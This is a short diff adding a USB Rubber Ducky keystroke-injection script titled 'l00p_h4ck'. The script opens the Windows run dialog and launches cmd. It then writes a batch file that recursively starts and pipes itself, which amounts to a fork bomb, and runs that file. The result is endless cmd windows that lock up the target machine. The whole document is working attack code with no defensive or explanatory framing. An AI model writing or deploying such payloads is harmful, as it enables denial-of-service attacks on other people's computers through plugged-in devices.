@@ -1,0 +1,21 @@
+REM l00p_h4ck; creates a bat file that will endlessly open new cmd windows
+
+REM Open cmd
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 750
+
+STRING echo ^:L00P_H4CK.TXT.EXE^: > 00p.bat
+ENTER
+STRING echo start ^%0 >> 00p.bat
+ENTER
+STRING echo ^%0^|^%0 >> 00p.bat
+ENTER
+STRING echo goto ^:L00P_H4CK.TXT.EXE^: >> 00p.bat
+ENTER
+STRING 00p.bat
+ENTER
